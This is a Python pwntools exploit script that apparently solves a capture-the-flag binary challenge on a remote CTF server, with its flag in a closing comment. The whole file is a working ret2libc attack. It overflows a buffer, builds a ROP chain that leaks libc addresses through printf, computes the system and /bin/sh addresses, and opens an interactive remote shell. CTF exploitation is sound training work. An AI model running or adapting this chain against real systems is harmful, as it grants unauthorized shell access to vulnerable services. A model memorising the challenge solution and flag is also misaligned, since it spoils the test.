from pwn import *

r = remote('pwnremote.threatsims.com', 9001)

# libc6_2.31-0ubuntu9_amd64 

printf_plt = 0x401030
printf_got = 0x404018
setvbuf_got = 0x404028
pop_rdi = 0x40122b
pop_rsi_r15 = 0x401229
start = 0x401060
ret = 0x401016

payload = 'A'*40

payload += p64(pop_rdi)
payload += p64(printf_got) # printf arg
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(printf_plt)

# only need this leak once for libc finding
payload += p64(pop_rdi)
payload += p64(setvbuf_got) # printf arg
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(printf_plt)

payload += p64(pop_rdi)
payload += p64(1337) # cause we're leet
payload += p64(start)

r.sendline(payload)
r.recvuntil('> ')

printf = u64(r.recv(6)+'\x00\x00')
setvbuf = u64(r.recv(6)+'\x00\x00')

log.success('printf: '+hex(printf))
log.success('setvbuf: '+hex(setvbuf))

system = printf - 0xfa00
bin_sh = printf + 0x15279a

log.success('system: '+hex(system))
log.success('bin_sh: '+hex(bin_sh))

payload = 'A'*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

r.sendline(payload)

r.interactive()

# TS{DontLookMeInTheEye!StayOutOfMyPeripheralVision!}
